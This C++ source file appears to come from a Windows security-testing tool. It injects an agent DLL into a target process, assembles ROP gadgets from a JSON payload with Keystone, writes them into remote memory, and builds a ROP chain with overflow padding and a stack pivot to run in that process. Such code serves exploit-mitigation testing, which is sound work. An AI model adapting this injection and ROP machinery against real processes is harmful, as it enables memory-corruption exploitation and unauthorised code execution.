#include "../helpers.h"
#include "../../../Rapidjson/document.h"
#include "../../../Rapidjson/schema.h"
#include "../../../Rapidjson/stringbuffer.h"
#include "../../../Compiled_keystone/include/keystone.h"
#include "exec_ropchain.h"
#include <fstream>

#define JSON_PAYLOAD_SCHEMA "{\n\
\"type\": \"object\",\n\
\"properties\" : {\n\
    \"payload\": {\n\
        \"type\": \"array\",\n\
        \"items\" : {\n\
            \"type\": \"object\",\n\
                \"patternProperties\" : {\n\
                    \"^[G|F|D]$\": { \"type\": \"string\" }\n\
                },\n\
                \"additionalProperties\": false\n\
            }\n\
        }\n\
    },\n\
\"required\": [\"payload\"],\n\
\"additionalProperties\": false\n\
}"

void buildRopChain(const std::vector<std::pair <std::string, unsigned int>> intermediateRopChain,
    const rapidjson::Value& payloadArray,
    const LPVOID gadgetDbRemoteAddr,
    DWORD* fakePayload)
{
    // We go through the intermediateRopChain until one before the last one to avoid put the stack pivot gadget
    for (unsigned index = 0; index < (intermediateRopChain.size() - 1); ++index)
    {
        if (intermediateRopChain[index].first == "G")
        {
            unsigned int currentGadgetOffset = intermediateRopChain[index].second;
            char * address = (char *)gadgetDbRemoteAddr + currentGadgetOffset;
            fakePayload[index] = (DWORD)address;

            std::wcout << std::setw(15) << std::left << "    GADGET:" << std::setw(80) << std::left
                << payloadArray[index].FindMember("G")->value.GetString()
                << " --> 0x" << std::hex << (DWORD)address << std::endl;
        }
        else if (intermediateRopChain[index].first == "D")
        {
            char * payloadData = (char *)intermediateRopChain[index].second;
            fakePayload[index] = (DWORD)payloadData;

            std::wcout << std::setw(15) << std::left << "    DATA:" << std::setw(80) << std::left
                << " " << "     " << payloadArray[index].FindMember("D")->value.GetString() << std::endl;
        }
        else if (intermediateRopChain[index].first == "F")
        {
            char * payloadData = (char *)intermediateRopChain[index].second;
            fakePayload[index] = (DWORD)payloadData;

            std::wcout << std::setw(15) << std::left << "    FUNCTION:" << std::setw(80) << std::left
                << payloadArray[index].FindMember("F")->value.GetString()
                << " --> 0x" << std::hex << (DWORD)payloadData << std::endl;
        }
    }
}

bool buildGadgetDB(const rapidjson::Value& payloadArray,
    TestToolHelpers::IPCClient* client,
    std::vector<std::pair <std::string, unsigned int>>* intermediateRopChain,
    char* gadgetDbEncoded)
{
    bool retValue = true;
    int retError = 0;

#if defined(_WIN64)
    ks_arch arch = KS_ARCH_X86;
    int mode = KS_MODE_64;
#elif defined(_WIN32) || defined(__WIN32__) || defined(WIN32)
    ks_arch arch = KS_ARCH_X86;
    int mode = KS_MODE_32;
#endif
    ks_engine *ksEngine = nullptr;

    retError = ks_open(arch, mode, &ksEngine);
    if (retError == KS_ERR_OK)
    {
        // Building the gadgetDbEncoded array to send it to the injected process
        // Also building an intermediateRopChain vector. It contains: - Gadget offsets (to be fixed after getting the remote GadgetDB address)
        //                                                            - Data values
        //                                                            - Remote functions addresses (are interpreted as data)
        unsigned int gadgetOffset = 0;

        ks_option(ksEngine, KS_OPT_SYNTAX, 0);

        for (rapidjson::SizeType index = 0; index < payloadArray.Size(); ++index)
        {
            if (payloadArray[index].FindMember("G") != payloadArray[index].MemberEnd()) // If it is a gadget...
            {
                std::string currentGadget = payloadArray[index].FindMember("G")->value.GetString();

                unsigned char * assemblyBytes = nullptr;
                size_t assemblySize = 0;
                size_t count = 0;

                if (ks_asm(ksEngine, currentGadget.c_str(), 0, &assemblyBytes, &assemblySize, &count))
                {
                    std::cerr << "    TestKeyStone: ks_asm() failed to compile Gadget: " << currentGadget
                        << "  ---  " << count << " statements " << ks_errno(ksEngine) << " error" << std::endl;
                }
                else
                {
                    intermediateRopChain->push_back(std::pair <std::string, unsigned int>("G", gadgetOffset));

                    for (unsigned int byteIndex = 0; byteIndex < assemblySize; ++byteIndex, ++gadgetOffset)
                        gadgetDbEncoded[gadgetOffset] = *(assemblyBytes + byteIndex);

                    std::cout << std::setw(17) << std::left << "    Assembled: " << std::setw(80) << std::left 
                        << currentGadget << " --- " << assemblySize
                        << " bytes and " << count << " statements" << std::endl;
                }
            }
            else if (payloadArray[index].FindMember("F") != payloadArray[index].MemberEnd()) // If it is a function...
            {
                std::string functionName(payloadArray[index].FindMember("F")->value.GetString());

                TestCommon::ARRAYBYTE ret = client->SendRequest(TestCommon::ExecutorsMode::GET_REMOTE_FUNCTION_ADDRESS,
                    (unsigned char *)functionName.c_str(), functionName.length());

                intermediateRopChain->push_back(std::pair <std::string, unsigned int>("F", *(DWORD*)(&ret[0])));

                std::cout << std::setw(17) << std::left << "    Function: " << std::setw(80) << std::left << functionName
                    << " --- 0x" << std::hex << *(DWORD*)(&ret[0]) << std::endl;
            }
            else // If it is data...
            {
                intermediateRopChain->push_back(std::pair <std::string, unsigned int>("D",
                    std::stoi(payloadArray[index].FindMember("D")->value.GetString(), nullptr, 16)));

                std::cout << std::setw(17) << std::left << "    Data: " << std::setw(80) << " " << " --- 0x"
                    << std::left << std::hex << payloadArray[index].FindMember("D")->value.GetString() << std::endl;
            }
        }

        //Adding the stack pivot gadget
        std::string currentGadget = "SUB ESP, 136 ; RET";
        unsigned char * assemblyBytes = nullptr;
        size_t assemblySize = 0;
        size_t count = 0;

        if (ks_asm(ksEngine, currentGadget.c_str(), 0, &assemblyBytes, &assemblySize, &count))
        {
            std::cerr << "    TestKeyStone: ks_asm() failed to compile Gadget: " << currentGadget
                << "  ---  " << count << " statements " << ks_errno(ksEngine) << " error" << std::endl;
        }
        else
        {
            intermediateRopChain->push_back(std::pair <std::string, unsigned int>("G", gadgetOffset));

            for (unsigned int byteIndex = 0; byteIndex < assemblySize; ++byteIndex, ++gadgetOffset)
                gadgetDbEncoded[gadgetOffset] = *(assemblyBytes + byteIndex);

            std::cout << std::setw(17) << std::left << "    Assembled: " << std::setw(80) << std::left
                << currentGadget << " --- " << assemblySize
                << " bytes and " << count << " statements" << std::endl;
        }
    }
    else
    {
        std::wcerr << L"[-] KeyStone: failed on ks_open()" << std::endl;
        retValue = false;
    }

    return retValue;
}

bool validatePayloadJsonFile(const char* fakePayloadJsonText, rapidjson::Document* fakePayloadJsonDocument) {
    bool retValue = false;

    // Building the schema for JSON payload structure validation
    rapidjson::Document fakePayloadJsonSchema;
    bool errorParsingJsonSchema = fakePayloadJsonSchema.Parse(JSON_PAYLOAD_SCHEMA).HasParseError();

    rapidjson::SchemaDocument schema(fakePayloadJsonSchema);
    rapidjson::SchemaValidator validator(schema);

    // Parsing fake payload JSON document
    bool errorParsingJsonDocument = fakePayloadJsonDocument->Parse(fakePayloadJsonText).HasParseError();

    if (!errorParsingJsonSchema && !errorParsingJsonDocument && fakePayloadJsonDocument->Accept(validator))
        retValue = true;
    else
    {
        std::wcerr << L"[-] The fake payload JSON file is not valid. Quitting now." << std::endl;

        rapidjson::StringBuffer errorInfo;
        validator.GetInvalidSchemaPointer().StringifyUriFragment(errorInfo);
        std::wcerr << L"    Invalid schema: " << errorInfo.GetString() << std::endl;
        std::wcerr << L"    Invalid keyword: " << validator.GetInvalidSchemaKeyword() << std::endl;
        errorInfo.Clear();
        validator.GetInvalidDocumentPointer().StringifyUriFragment(errorInfo);
        std::wcerr << L"    Invalid document: " << errorInfo.GetString() << std::endl;

        retValue = false;
    }

    return retValue;
}

bool ExecutorROPChain::Execute(TestCommon::TestData &data)
{
    bool retValue = true;

    std::wcout << L"[+] About to execute " << GetDescription() << std::endl;

    if (TestToolHelpers::IsTestDataValid(data))
    {
        DWORD fakeSize = MAX_PAYLOAD_SIZE;
        DWORD bytesRead = 0;

        char fakePayloadJsonText[MAX_PAYLOAD_SIZE] = { 0 };
        rapidjson::Document fakePayloadJsonDocument;

        std::wcout << "[+] Validating payload JSON file" << std::endl;
        if (TestToolHelpers::ReadFileToInjectInBuffer(data.testcaseFile, fakeSize, fakePayloadJsonText, bytesRead) &&
            validatePayloadJsonFile(fakePayloadJsonText, &fakePayloadJsonDocument))
        {
            HANDLE hProcess;

            std::wcout << "[+] Injecting agent into the remote process" << std::endl;
            if (TestToolHelpers::InjectIntoRemoteProcess(data.fileToInject, data.pidToInject, hProcess))
            {
                const rapidjson::Value& payloadArray = fakePayloadJsonDocument["payload"];
                TestToolHelpers::IPCClient* client = new TestToolHelpers::IPCClient(data.channelID);
                std::vector<std::pair <std::string, unsigned int>> intermediateRopChain;
                char gadgetDbEncoded[MAX_PAYLOAD_SIZE] = { 0 };

                system("pause");
                std::wcout << "[+] Filling Gadget DB" << std::endl;
                if (buildGadgetDB(payloadArray, client, &intermediateRopChain, gadgetDbEncoded))
                {
                    DWORD gadgetDbSize = MAX_PAYLOAD_SIZE;
                    LPVOID gadgetDbRemoteAddr = nullptr;

                    std::wcout << "[+] Writting Gadget DB into the remote process memory" << std::endl;
                    if (TestToolHelpers::WriteRemoteProcessMemory(hProcess, gadgetDbEncoded, gadgetDbSize, gadgetDbRemoteAddr))
                    {
                        DWORD fakePayload[MAX_PAYLOAD_SIZE] = { 0 };

                        system("pause");
                        std::wcout << "[+] Building ROP chain payload" << std::endl;
                        buildRopChain(intermediateRopChain, payloadArray, gadgetDbRemoteAddr, fakePayload);

                        std::wcout << "[+] Writing binary file with ROP chain" << std::endl;
                        FILE * ropChainFile = fopen("C:\\rop_chain.txt", "wb");
                        if (ropChainFile != NULL)
                        {
                            // First filling with the gadget offsets and data for the stack
                            unsigned index = 0;
                            for (; index < payloadArray.Size() + 1; ++index) {
                                DWORD address = fakePayload[index];
                                fwrite(&address, sizeof(DWORD), 1, ropChainFile);
                            }

                            // Next we fill with 'A' characters untill making a buffer overflow
                            for (; index < 33; ++index) {
                                fakePayload[index] = (DWORD)"\x41\x41\x41\x41";
                                fwrite("\x41\x41\x41\x41", sizeof(char), 4, ropChainFile);
                            }

                            // Finally we put the offset for the stack pivot gadgets
                            unsigned int currentGadgetOffset = intermediateRopChain[(intermediateRopChain.size() - 1)].second;
                            char * address = (char *)gadgetDbRemoteAddr + currentGadgetOffset;
                            fakePayload[index] = (DWORD)address;
                            fwrite(&address, sizeof(DWORD), 1, ropChainFile);

                            fclose(ropChainFile);

                            std::wcout << "[+] About to request the ROP chain execution to the target process" << std::endl;
                            system("pause");

                            //Opening IPC and sending ROP chain here

                            TestCommon::ARRAYBYTE ret = client->SendRequest(TestCommon::ExecutorsMode::TEST_ROP_CHAIN, (unsigned char *)fakePayload, fakeSize);
                        }
                        else
                        {
                            std::wcerr << L"[-] Error opening file to write the ROP chain" << std::endl;
                            retValue = false;
                        }
                    }
                    else
                    {
                        std::wcerr << L"[-] There was a problem injecting the agent and Gadget DB into target process. Quitting now." << std::endl;
                        retValue = false;
                    }

                    CloseHandle(hProcess);
                }
                else
                {
                    std::wcerr << L"[-] Error building Gadget DB." << std::endl;
                    retValue = false;
                }
            }
            else
            {
                std::wcerr << L"[-] Error injecting agent DLL into the remote process." << std::endl;
                retValue = false;
            }
        }
        else
        {
            std::wcerr << L"[-] Error getting data from fake payload JSON file. Quitting now." << std::endl;
            retValue = false;
        }
    }

    return retValue;
}